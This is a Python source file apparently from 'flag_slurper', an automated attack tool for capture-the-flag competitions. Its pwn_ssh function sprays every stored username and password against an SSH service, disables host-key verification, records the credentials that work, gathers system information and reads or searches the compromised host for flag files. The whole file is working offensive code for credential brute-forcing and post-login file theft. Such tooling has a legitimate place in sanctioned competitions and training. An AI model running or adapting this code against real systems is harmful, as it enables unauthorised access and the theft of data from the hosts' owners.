import logging
import os
from typing import Tuple

import requests
import paramiko

from flag_slurper.autolib.exploit import get_file_contents, get_system_info
from .exploit import find_flags, FlagConf
from .models import Service, CredentialBag, Credential, Flag, CaptureNote

logger = logging.getLogger(__name__)


def _get_ssh_client():
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    return ssh


def pwn_ssh(url: str, port: int, service: Service, flag_conf: FlagConf) -> Tuple[str, bool, bool]:
    ssh = _get_ssh_client()
    base_dir = flag_conf['location'] if flag_conf else None
    enable_search = flag_conf['search'] if flag_conf else True

    working = set()
    credentials = CredentialBag.select()
    for credential in credentials:
        try:
            cred = credential.credentials.where(Credential.service == service).get()
        except Credential.DoesNotExist:
            cred = Credential.create(service=service, state=Credential.REJECT, bag=credential)

        try:
            with ssh:
                logger.debug("Attempting {} with creds: {}".format(url, cred))
                ssh.connect(url, port=port, username=credential.username, password=credential.password,
                            look_for_keys=False)
                cred.state = Credential.WORKS
                cred.save()
                working.add(cred)

                sysinfo = get_system_info(ssh)

                flag_obj, _ = Flag.get_or_create(team=service.team, name=flag_conf['name'])

                if flag_conf:
                    location = flag_conf['name']
                    full_location = os.path.join(base_dir, location)
                    flag = get_file_contents(ssh, full_location)
                    if flag:
                        enable_search = False
                        note, created = CaptureNote.get_or_create(flag=flag_obj, data=flag, location=full_location,
                                                                  notes=str(sysinfo), service=service)

                if enable_search:
                    flags = find_flags(ssh, base_dir=base_dir)
                    for flag in flags:
                        CaptureNote.get_or_create(flag=flag_obj, data=flag[1], location=flag[0], notes=str(sysinfo),
                                                  searched=True, service=service)
        except Exception:
            continue

    if working:
        return "Found credentials: {}".format(working), True, False
    else:
        return 'Authentication failed', False, False


PWN_FUNCS = {
    'ssh': pwn_ssh,
}
